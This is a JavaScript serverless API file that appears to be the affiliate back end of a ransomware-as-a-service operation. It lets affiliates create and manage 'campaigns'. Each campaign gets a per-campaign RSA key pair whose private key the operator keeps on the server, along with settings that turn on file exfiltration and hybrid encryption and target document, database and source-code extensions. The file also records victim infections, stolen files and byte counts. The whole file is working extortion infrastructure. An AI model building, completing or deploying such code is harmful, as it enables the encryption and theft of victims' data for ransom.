// vercel-dashboard/api/affiliate/campaigns.js
// Affiliate campaign management (scoped to their campaigns only)

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  const affiliateId = `aff_${auth.campaignId.replace('camp_', '')}`;

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response, auth, affiliateId);
      case 'POST':
        return await handlePost(request, response, auth, affiliateId);
      case 'PUT':
        return await handlePut(request, response, auth, affiliateId);
      case 'DELETE':
        return await handleDelete(request, response, auth, affiliateId);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Affiliate campaigns error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response, auth, affiliateId) {
  const { id, includeStats } = request.query;

  // Get affiliate's campaign IDs
  const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];

  if (id) {
    // Check ownership
    if (!campaignIds.includes(id)) {
      return response.status(403).json({ error: 'Access denied' });
    }

    const campaign = await kv.get(`campaign:${id}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

    // Strip private keys
    const { privateKeyPem, privateKeyJwk, ...safeCampaign } = campaign;

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`campaign:${id}:stats`);
      const systems = await kv.smembers(`campaign:${id}:systems`) || [];
      safeCampaign.stats = stats || {};
      safeCampaign.systemCount = systems.length;
      safeCampaign.systems = systems.slice(0, 50);
    }
    return response.json(safeCampaign);
  }

  // List all campaigns
  const campaigns = [];

  for (const cid of campaignIds) {
    const c = await kv.get(`campaign:${cid}`);
    if (c) {
      const { privateKeyPem, privateKeyJwk, ...safeCampaign } = c;
      
      const stats = await kv.hgetall(`campaign:${cid}:stats`);
      const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
      campaigns.push({
        ...safeCampaign,
        stats: {
          totalInfections: parseInt(stats?.totalInfections || '0'),
          totalFiles: parseInt(stats?.totalFiles || '0'),
          totalBytes: parseInt(stats?.totalBytes || '0'),
          lastActivity: stats?.lastActivity
        },
        systemCount
      });
    }
  }

  campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));

  return response.json({ campaigns, total: campaigns.length });
}

async function handlePost(request, response, auth, affiliateId) {
  const { name, description, rsaKeySize = 4096 } = request.body;

  if (!name) return response.status(400).json({ error: 'Campaign name required' });
  if (rsaKeySize !== 2048 && rsaKeySize !== 4096) {
    return response.status(400).json({ error: 'rsaKeySize must be 2048 or 4096' });
  }

  const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const generatedApiKey = `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

  // Generate RSA key pair
  const keyPair = await generateRSAKeyPair(rsaKeySize);

  const campaign = {
    id,
    name,
    description: description || '',
    apiKey: generatedApiKey,
    rsaKeySize,
    status: 'active',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    affiliateId,
    publicKeyPem: keyPair.publicKeyPem,
    publicKeyJwk: keyPair.publicKeyJwk,
    privateKeyPem: keyPair.privateKeyPem,
    privateKeyJwk: keyPair.privateKeyJwk,
    settings: {
      exfilEnabled: true,
      encryptionMode: 'Hybrid',
      maxFileSizeMB: 50,
      targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js']
    }
  };

  const operations = [
    kv.set(`campaign:${id}`, campaign),
    kv.sadd('global:campaigns', id),
    kv.sadd(`affiliate:${affiliateId}:campaigns`, id),
    kv.hset(`campaign:${id}:stats`, {
      totalInfections: 0,
      totalFiles: 0,
      totalBytes: 0,
      createdAt: campaign.createdAt
    }),
    kv.hincrby(`affiliate:${affiliateId}:stats`, 'totalCampaignsCreated', 1)
  ];

  await Promise.all(operations);

  // Return without private keys
  const { privateKeyPem, privateKeyJwk, ...safeResponse } = campaign;
  return response.status(201).json(safeResponse);
}

async function handlePut(request, response, auth, affiliateId) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  // Check ownership
  const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];
  if (!campaignIds.includes(id)) {
    return response.status(403).json({ error: 'Access denied' });
  }

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  // Prevent changing keys and affiliateId
  const { privateKeyPem, privateKeyJwk, publicKeyPem, publicKeyJwk, apiKey, id: _, createdAt, affiliateId: _, ...allowedUpdates } = updates;

  const updated = {
    ...existing,
    ...allowedUpdates,
    id,
    updatedAt: new Date().toISOString()
  };

  await kv.set(`campaign:${id}`, updated);

  const { privateKeyPem: __, privateKeyJwk: ___, ...safeResponse } = updated;
  return response.json(safeResponse);
}

async function handleDelete(request, response, auth, affiliateId) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  // Check ownership
  const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];
  if (!campaignIds.includes(id)) {
    return response.status(403).json({ error: 'Access denied' });
  }

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  const systems = await kv.smembers(`campaign:${id}:systems`) || [];
  const cleanup = [
    kv.del(`campaign:${id}`),
    kv.del(`campaign:${id}:stats`),
    kv.del(`campaign:${id}:systems`),
    kv.srem('global:campaigns', id),
    kv.srem(`affiliate:${affiliateId}:campaigns`, id)
  ];

  for (const sysId of systems) {
    cleanup.push(kv.srem(`system:${sysId}:campaigns`, id));
  }

  await Promise.all(cleanup);
  return response.json({ success: true, deleted: id });
}

async function generateRSAKeyPair(keySize) {
  const subtle = crypto.subtle;
  
  const keyPair = await subtle.generateKey(
    {
      name: 'RSA-OAEP',
      modulusLength: keySize,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: 'SHA-256'
    },
    true,
    ['encrypt', 'decrypt']
  );

  const publicKeySpki = await subtle.exportKey('spki', keyPair.publicKey);
  const publicKeyPem = arrayBufferToPem(publicKeySpki, 'PUBLIC KEY');

  const privateKeyPkcs8 = await subtle.exportKey('pkcs8', keyPair.privateKey);
  const privateKeyPem = arrayBufferToPem(privateKeyPkcs8, 'PRIVATE KEY');

  const publicKeyJwk = await subtle.exportKey('jwk', keyPair.publicKey);
  const privateKeyJwk = await subtle.exportKey('jwk', keyPair.privateKey);

  return { publicKeyPem, privateKeyPem, publicKeyJwk, privateKeyJwk };
}

function arrayBufferToPem(buffer, type) {
  const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
  const lines = base64.match(/.{1,64}/g).join('\n');
  return `-----BEGIN ${type}-----\n${lines}\n-----END ${type}-----`;
}